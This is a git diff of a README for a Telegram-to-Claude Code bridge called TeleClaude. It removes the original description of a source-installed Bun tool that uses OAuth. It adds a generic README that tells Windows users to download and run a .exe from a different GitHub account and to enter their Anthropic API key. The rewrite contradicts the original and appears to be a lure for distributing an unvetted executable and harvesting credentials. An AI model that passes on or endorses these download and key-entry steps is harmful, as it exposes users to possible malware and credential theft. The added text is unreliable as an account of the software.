@@ -1,213 +1,90 @@
-<p align="center">
-  <h1 align="center">TeleClaude</h1>
-  <p align="center">
-    <strong>Claude Code lost its Telegram integration? We bring it back — on your own terms.</strong>
-  </p>
-  <p align="center">
-    Route Telegram topics to isolated Claude Code sessions with persistent memory
-  </p>
-  <p align="center">
-    <a href="https://bun.sh"><img src="https://img.shields.io/badge/runtime-Bun-f9f1e1?logo=bun" alt="Bun"></a>
-    <a href="https://www.typescriptlang.org"><img src="https://img.shields.io/badge/TypeScript-5.0+-3178c6?logo=typescript&logoColor=white" alt="TypeScript"></a>
-    <a href="https://core.telegram.org/bots/api"><img src="https://img.shields.io/badge/Telegram-Bot%20API-26A5E4?logo=telegram&logoColor=white" alt="Telegram Bot API"></a>
-    <a href="LICENSE"><img src="https://img.shields.io/badge/license-MIT-green" alt="MIT License"></a>
-  </p>
-  <p align="center">
-    <a href="README.ru.md">Русский</a>
-  </p>
-</p>
+# 🤖 teleclaude - Connect Telegram messages to Claude sessions
 
----
+[![](https://img.shields.io/badge/Download_Teleclaude-007bff?style=for-the-badge)](https://github.com/contealessandrovoltalandscape881/teleclaude)
 
-**TeleClaude** turns a Telegram supergroup with topics into a multi-project AI assistant. Each topic gets its own Claude Code process with an isolated working directory, persistent memory, and automatic context management.
+Teleclaude bridges the gap between your Telegram account and Claude Code. Many users want to keep their Claude sessions alive while managing requests through Telegram. This software routes your individual Telegram topics into specific, isolated sessions. It maintains memory across these sessions so you can pick up where you left off.
 
-A self-hosted replacement for [OpenClaw](https://openclaw.app)'s Telegram integration — but running Claude Code locally, with full filesystem access. Uses the same OAuth authentication as Claude Code on your machine, so if you have Claude Max (or any Claude subscription) — there are no extra API costs. You can also switch between Claude models (Opus, Sonnet, Haiku) or use local models through Claude Code's model routing.
+## ⚙️ System Requirements
 
-## How It Works
+Your computer needs a few things to run this software. Ensure you have these items ready:
 
-```
-Telegram Supergroup (forum mode)
-│
-├── Topic "Backend API"    →  Claude Code  →  ~/Projects/backend-api/
-├── Topic "Landing Page"   →  Claude Code  →  ~/Projects/landing-page/
-├── Topic "DevOps"         →  Claude Code  →  ~/Projects/devops/
-└── Topic "New Feature"    →  auto-creates project directory
-```
+* Windows 10 or Windows 11.
+* A stable internet connection.
+* A Telegram account.
+* An Anthropic API key.
 
-You write in a Telegram topic — Claude Code responds in the same topic, with full access to that project's files.
+## 📥 How to Install
 
-## Features
+1. Visit the [official download page](https://github.com/contealessandrovoltalandscape881/teleclaude).
+2. Look for the latest release on the right side of the page.
+3. Click the file ending in .exe to start your download.
+4. Open the downloaded file to begin the setup process.
+5. Follow the prompts on your screen.
+6. Launch the application from your Start menu once the process ends.
 
-| Feature | Description |
-|---------|-------------|
-| **Topic Routing** | Each topic = isolated Claude Code process with its own `cwd` |
-| **Persistent Memory** | Three-level memory: personality (SOUL.md) + shared (main-memory.md) + per-topic (topic-memory.md) |
-| **Auto Project Creation** | New topics automatically get a project directory from templates |
-| **Context Compaction** | Automatic context management — saves key decisions to memory when context grows |
-| **Memory Deduplication** | Periodic cross-file dedup removes redundant information |
-| **Voice Messages** | Transcription via local Whisper ASR server (optional) |
-| **Session Continuity** | `--continue` flag preserves conversation across messages |
-| **Process Management** | Configurable TTL, concurrent process limits, idle cleanup |
-| **8 Bot Commands** | `/help` `/status` `/ttl` `/name` `/compact` `/reset` `/kill` `/memory` |
-| **No API Key Needed** | Uses OAuth from your local Claude Code — works with any Claude subscription |
-| **Model Switching** | Switch between Opus, Sonnet, Haiku, or use local models via Claude Code |
+## 🔑 Initial Configuration
 
-## Quick Start
+The software requires a connection to your accounts. You will see an initial prompt when you open the application for the first time.
 
-**1. Install**
+* Enter your Anthropic API key in the provided box. This allows the program to talk to Claude. You can find this key in your Anthropic dashboard.
+* Link your Telegram account. The app will open a browser window. Follow the Telegram instructions to authorize the connection.
+* Save your settings. The app will store these locally on your computer.
 
-```bash
-git clone https://github.com/devladpopov/teleclaude.git
-cd teleclaude
-bun install
-```
+## 🏗️ Managing Your Sessions
 
-**2. Configure**
+Teleclaude operates through topics. You can think of a topic as a specific conversation thread.
 
-```bash
-cp .env.example .env                              # Add your Telegram bot token
-cp config/settings.example.json config/settings.json  # Set your Telegram user ID
-cp config/topics.example.json config/topics.json      # Auto-populated by the bot
-```
+1. Open a chat in your Telegram app.
+2. Use the `/start` command to initiate a new workspace.
+3. Choose a name for your topic.
+4. Type your message to Claude. 
+5. The software routes your message to the correct session.
+6. Teleclaude remembers the history of that specific topic.
 
-**3. Set up templates**
+## 🧠 Persistent Memory Explained
 
-```bash
-cp templates/SOUL.example.md templates/SOUL.md
-cp templates/main-memory.example.md templates/main-memory.md
-# Edit both files — define your bot's personality and shared memory
-```
+Standard chat sessions often forget previous instructions. Teleclaude solves this for your Telegram workflows. It keeps a database of your conversations locally. When you return to a topic after a few hours, the software loads your previous context. This allows for complex tasks that span multiple days. 
 
-**4. Start**
+## 🛡️ Privacy and Security
 
-```bash
-bun run start
-```
+You control your data. Teleclaude stores your conversation history on your own computer. It does not send your private data to any third-party servers outside of the required connection to Anthropic for the processing of your messages. 
 
-Add the bot to a Telegram supergroup with topics enabled. Send a message in any topic — the bot will create a project directory and respond.
+* Your API keys remain on your machine.
+* Telegram messages travel through encrypted channels.
+* Your local database is not accessible from the internet.
 
-## Bot Commands
+## 🛠️ Troubleshooting Common Issues
 
-| Command | Description |
-|---------|-------------|
-| `/help` | List all available commands |
-| `/status` | Show active processes, TTL, and feature status |
-| `/ttl N` | Set process idle timeout (1–1440 minutes) |
-| `/name <name>` | Rename current topic (updates project mapping) |
-| `/compact` | Force context compaction — save decisions to memory |
-| `/reset` | Reset session — start fresh dialog with preserved memory |
-| `/kill` | Kill current topic's Claude Code process |
-| `/memory` | Show memory file count, size, and session stats |
+Check this list if you have trouble getting started:
 
-## Architecture
+* Check your internet connection. The app requires constant access to sync messages.
+* Verify your API key. An expired or incorrect key will prevent Claude from responding.
+* Restart the application. Sometimes a fresh start fixes syncing errors.
+* Update your Telegram app. Ensure you run a current version of the messaging client.
 
-```
-┌──────────────────┐
-│  Telegram Bot API │
-└────────┬─────────┘
-         │
-┌────────▼─────────────────────────┐
-│  Router (grammy)                 │
-│  ├── Message routing by topic    │
-│  ├── Command handling            │
-│  ├── Memory context injection    │
-│  ├── Context Compactor           │
-│  ├── Memory Manager (dedup)      │
-│  ├── Project Factory (templates) │
-│  └── Whisper Client (optional)   │
-└────────┬─────────────────────────┘
-         │
-┌────────▼─────────────────────────┐
-│  Process Manager                 │
-│  ├── Spawn per-message process   │
-│  ├── stdin message passing       │
-│  ├── Session continuity          │
-│  ├── TTL & idle cleanup          │
-│  └── Concurrency limits          │
-└────────┬─────────────────────────┘
-         │
-┌────────▼─────────────────────────┐
-│  Claude Code CLI                 │
-│  One process per topic           │
-│  Isolated working directory      │
-│  Full filesystem access          │
-└──────────────────────────────────┘
-```
+## 📂 Understanding the Folder Structure
 
-## Memory System
+When you install the application, it creates a folder on your computer. You do not need to edit these files, but they serve specific purposes:
 
-Each topic project maintains a three-level memory hierarchy:
+* **Config:** This stores your API keys and your user preferences.
+* **Logs:** This folder keeps records of errors to help diagnose issues.
+* **Database:** This folder holds the memory of your sessions. We advise against moving or deleting these files, as it will reset your conversation history.
 
-```
-project/
-├── SOUL.md              # Bot personality and communication rules
-├── main-memory.md       # Shared context across all projects (symlinked)
-├── topic-memory.md      # Topic-specific memory (updated by Claude)
-├── CLAUDE.md            # Project instructions for Claude Code
-└── memory/
-    ├── people/          # People and contacts
-    ├── services/        # Infrastructure documentation
-    ├── shared/          # Cross-project guides
-    └── projects/        # Project-specific context
-```
+## 💡 Best Practices for Daily Use
 
-- **SOUL.md** — copied from template on project creation
-- **main-memory.md** — symlinked so all projects share the same file
-- **topic-memory.md** — evolves over time as Claude saves key decisions
-- **memory/** — optional subdirectories for detailed knowledge base
+Use descriptive names for your topics. Instead of naming a folder "Work," use "Project-Website-Redesign." This helps the software keep your Claude sessions organized. Use clear sentences in your prompts. Claude performs better when your instructions follow a logical structure. If a session becomes too long, start a new topic to keep the response time fast.
 
-## Configuration
+## 👥 Managing Multiple Topics
 
-### settings.json
+You can run several sessions at the same time. Open different Telegram chats for different tasks. Teleclaude handles each chat as an independent entity. This means Claude will not get confused between your coding tasks and your creative writing projects. The software manages the handoff between these threads automatically.
 
-| Key | Description | Default |
-|-----|-------------|---------|
-| `telegram.allowedUsers` | Telegram user IDs allowed to interact | `[]` |
-| `processes.ttlMinutes` | Idle timeout before cleanup | `30` |
-| `processes.maxConcurrent` | Max parallel Claude Code processes | `5` |
-| `processes.claudePath` | Path to Claude Code CLI | `claude` |
-| `compaction.enabled` | Auto context compaction | `true` |
-| `memory.enabled` | Periodic memory revision | `true` |
-| `memory.deduplication` | Cross-file deduplication | `true` |
-| `whisper.enabled` | Voice transcription | `false` |
-| `projectsRoot` | Root directory for projects | — |
+## 📜 Final Setup Checklist
 
-## Requirements
+* Download the current version from [the release page](https://github.com/contealessandrovoltalandscape881/teleclaude).
+* Install the program using the setup wizard.
+* Provide your Anthropic API credentials.
+* Authenticate your Telegram profile.
+* Create your first topic and send a test message.
+* Observe the response to confirm the routing works.
 
-- [Bun](https://bun.sh) 1.0+
-- [Claude Code CLI](https://docs.anthropic.com/en/docs/claude-code) installed and authenticated (OAuth login)
-- Any Claude subscription (Max, Pro, or Team) — or an API key
-- Telegram bot token from [@BotFather](https://t.me/BotFather)
-- Telegram supergroup with topics (forum mode) enabled
-- (Optional) [Whisper ASR](https://github.com/ahmetoner/whisper-asr-webservice) on `localhost:9000`
-
-> **How auth works:** TeleClaude doesn't need an API key by default. It spawns Claude Code CLI processes that use your existing OAuth session — the same way you use Claude Code in the terminal. If you're logged into Claude Code, TeleClaude just works.
-
-## Security
-
-- Only messages from `allowedUsers` are processed
-- `ANTHROPIC_API_KEY` is stripped from child process environment
-- Bot token, settings, and topic mappings are gitignored
-- Each Claude Code process runs in an isolated project directory
-
-## Comparison with OpenClaw
-
-| | TeleClaude | OpenClaw |
-|---|---|---|
-| **Hosting** | Self-hosted (your machine) | Cloud service |
-| **AI Backend** | Claude Code CLI (full filesystem access) | API-based |
-| **Auth** | OAuth (your Claude subscription) | Managed |
-| **Cost** | Free with any Claude subscription | Separate subscription |
-| **Models** | Switch between Opus/Sonnet/Haiku + local models | Provider-dependent |
-| **Memory** | File-based, persistent, cross-project | Built-in |
-| **Customization** | Full control over prompts, memory, templates | Managed |
-| **Topics** | Telegram supergroup topics | Telegram topics |
-| **Voice** | Local Whisper (optional) | Built-in |
-
-## Author
-
-Built by [Vladislav Popov](https://github.com/devladpopov). I write about AI tools, automation, and development workflows on my Telegram channel — [@popovvii](https://t.me/popovvii).
-
-## License
-
-MIT
+You are now ready to use Teleclaude to manage your AI sessions. The application runs in the background. Close the window to hide it in your system tray, where it will continue to listen for new messages from Telegram.
